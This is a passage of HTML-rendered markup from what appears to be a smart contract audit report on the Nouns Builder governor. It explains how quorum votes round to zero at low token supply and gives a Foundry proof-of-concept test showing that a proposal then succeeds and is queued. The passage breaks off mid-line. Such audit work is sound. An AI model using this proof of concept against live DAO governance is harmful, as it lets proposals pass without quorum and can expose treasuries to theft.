class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the proposal doesn&#39;t already exist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_EXISTS</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Used to store the snapshot and deadline</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">snapshot</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Cannot realistically overflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Compute the snapshot and deadline</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">snapshot</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votingDelay</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">snapshot</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votingPeriod</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Store the proposal data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">snapshot</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalThreshold</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentProposalThreshold</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk11\">quorum</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposer</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timeCreated</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCreated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_description</span><span class=\"mtk1\">, </span><span class=\"mtk12\">descriptionHash</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>When determining the proposal’s state, the following <code>state</code> function is called, which can execute <code>else if (proposal.forVotes &#x3C; proposal.againstVotes || proposal.forVotes &#x3C; proposal.quorumVotes) { return ProposalState.Defeated; }</code>. If <code>proposal.quorumVotes</code> is 0, the <code>proposal.forVotes &#x3C; proposal.quorumVotes</code> condition would always be <code>false</code>. Essentially, quorum votes have no effect at all for determining whether the proposal is defeated or succeeded when the token supply is low. Hence, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed if there are effective quorum votes for which the for votes fail to reach can be passed, or vice versa, so the impact can be huge.</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get a copy of the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the proposal exists</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_DOES_NOT_EXIST</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If the proposal was executed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Executed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal was canceled:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">canceled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Canceled</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal was vetoed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vetoed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Vetoed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if voting has not started:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Pending</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if voting has not ended:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteEnd</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Active</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal failed (outvoted OR didn&#39;t reach quorum):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">againstVotes</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal has not been queued:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">timestamp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Succeeded</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal can no longer be executed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isExpired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Expired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else the proposal is queued</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Queued</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please append the following test in <code>test\\Gov.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_QueueProposalWithZeroQuorumVotes</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintVoter1</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">mockProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">descriptionHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;test&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// token supply is only 4 at this moment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// the calculated quorum votes is 0 because the token supply is low</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">((</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">quorumThresholdBps</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter1 creates the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">propose</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;test&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">hashProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk12\">descriptionHash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">votingDelay</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">castVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">votingPeriod</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// quorum votes corresponding to the proposal is 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// the proposal is succeeded</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Succeeded</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter1 is able to queue the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">queue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span 